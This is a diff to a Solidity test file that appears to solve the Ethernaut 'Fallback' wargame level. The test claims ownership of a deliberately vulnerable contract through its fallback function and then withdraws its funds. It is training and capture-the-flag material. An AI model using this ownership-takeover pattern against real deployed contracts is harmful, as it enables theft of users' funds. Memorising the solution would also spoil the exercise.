@@ -18,10 +18,11 @@ contract FallbackTest is LevelFactory {
   IFallback fallbhack;
 
   function setUp() public {
-    vm.prank(deployer); // deploy the contract as deployer
+    vm.startPrank(deployer); // deploy the contract as deployer
     fallbhack = IFallback(address(new Fallback()));
     uint256 contrib = fallbhack.contributions(deployer);
     deal(address(fallbhack), contrib);
+    vm.stopPrank();
   }
 
   function testAttack() public {
@@ -29,16 +30,15 @@ contract FallbackTest is LevelFactory {
   }
 
   function _performTest() internal override {
-    /* Write your code here */  
     fallbhack.contribute.value(1 wei)(); // Just add a contribution
-    (bool worked,) = payable(address(fallbhack)).call.value(1 wei)(""); // Claim ownership
+    (bool worked,) = address(fallbhack).call.value(1 wei)(""); // Claim ownership
     assert(worked);
     fallbhack.withdraw(); // Withdraw funds
-    /* Write your code here */ 
   }
 
   function _setupTest() internal override {
     super._setupTest();
+    vm.deal(attacker, 1 ether);
   }
 
   function _checkTest() internal override returns (bool) {
